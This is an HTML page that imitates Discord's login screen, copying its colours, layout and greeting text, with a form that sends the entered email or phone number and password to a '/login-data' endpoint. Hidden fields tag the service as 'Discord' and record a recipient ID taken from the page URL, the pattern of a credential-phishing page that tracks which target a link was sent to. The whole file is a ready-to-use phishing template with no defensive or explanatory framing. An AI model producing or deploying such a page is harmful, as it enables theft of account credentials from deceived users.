<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        body { background-color: #36393f; color: #fff; font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background-color: #2f3136; padding: 32px; border-radius: 5px; box-shadow: 0 2px 10px 0 rgba(0, 0, 0, 0.2); width: 480px; box-sizing: border-box; }
        .title { text-align: center; font-size: 24px; font-weight: 600; }
        .subtitle { text-align: center; color: #b9bbbe; font-size: 14px; margin-top: 8px; margin-bottom: 20px; }
        label { color: #8e9297; font-size: 12px; font-weight: 600; text-transform: uppercase; }
        input { width: 100%; background-color: #202225; border: 1px solid #202225; border-radius: 3px; color: #dcddde; height: 40px; padding: 10px; margin-top: 8px; margin-bottom: 20px; box-sizing: border-box; }
        button { width: 100%; height: 44px; background-color: #5865f2; color: #fff; border: none; border-radius: 3px; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h3 class="title">Welcome back!</h3>
        <div class="subtitle">We're so excited to see you again!</div>
        <form action="/login-data" method="post">
            <label for="username">Email or Phone Number</label>
            <input type="text" id="username" name="username" required>
            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>
            <!-- HIDDEN FIELDS -->
            <input type="hidden" name="service" value="Discord">
            <input type="hidden" id="recipientId" name="recipientId" value="">
            <button type="submit">Log In</button>
        </form>
    </div>
    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const userId = new URLSearchParams(window.location.search).get('uid');
            if (userId) document.getElementById('recipientId').value = userId;
        });
    </script>
</body>
</html>
